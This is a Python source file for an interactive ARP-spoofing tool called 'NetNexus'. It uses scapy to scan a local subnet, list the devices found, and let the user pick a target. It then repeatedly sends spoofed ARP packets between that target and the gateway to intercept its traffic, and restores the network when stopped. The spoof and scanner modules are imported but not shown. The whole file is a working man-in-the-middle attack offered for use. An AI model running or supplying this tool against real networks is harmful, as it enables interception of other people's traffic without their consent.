import scapy.all as scapy
import os
import time
import sys
from core import scanner, spoof

def main():
    # CONFIGURATION: Set your Arch interface (check 'ip a')
    scapy.conf.iface = "wlan0" 
    
    if os.geteuid() != 0:
        print("[-] NetNexus requires root. Run with: sudo python main.py")
        return

    gateway_ip = "192.168.8.1"
    ip_range = "192.168.8.1/24"

    while True:
        print("\n" + "="*40)
        print("      NetNexus: Discovery & Control")
        print("="*40)
        print(f"[*] Scanning {ip_range}... please wait.")
        
        devices = scanner.scan(ip_range)
        
        print("\nID\tIP Address\t\tMAC Address\t\tDevice Name")
        print("-" * 95)
        for index, device in enumerate(devices):
            print(f"{index}\t{device['ip']}\t\t{device['mac']}\t{device['name']}")
        
        print("-" * 95)
        print("[R] Refresh/Rescan Network")
        print("[C] Cancel and Exit")
        
        user_input = input("\nSelect Target ID or Option: ").lower().strip()

        if user_input == 'c':
            print("[*] Exiting NetNexus. Goodbye.")
            sys.exit()
        elif user_input == 'r':
            print("[*] Refreshing network map...")
            continue
        
        try:
            choice = int(user_input)
            target = devices[choice]
            target_ip = target['ip']
            target_mac = target['mac']

            print(f"[*] Resolving Gateway MAC...")
            gateway_mac, _ = spoof.get_device_info(gateway_ip)

            if not gateway_mac:
                print("[-] Error: Could not find Gateway. Try refreshing [R].")
                continue

            print(f"[*] Attack Active: Intercepting {target_ip} ({target['name']})")
            packet_count = 0
            while True:
                # Sends the spoofed packets
                spoof.spoof(target_ip, gateway_ip, target_mac, gateway_mac)
                packet_count += 2
                # Counter proves the script is running and not frozen
                print(f"\r[+] Intercepting... Packets Sent: {packet_count} | Ctrl+C to Stop", end="") 
                time.sleep(0.5)
                
        except (ValueError, IndexError):
            print("[-] Invalid choice. Use a number from the list, 'R', or 'C'.")
            time.sleep(1)
        except KeyboardInterrupt:
            print("\n\n[*] Stopping Attack... Restoring network for target.")
            spoof.restore(target_ip, gateway_ip)
            spoof.restore(gateway_ip, target_ip)
            print("[+] Network Restored. Returning to Menu...")
            time.sleep(1.5)

if __name__ == "__main__":
    main()
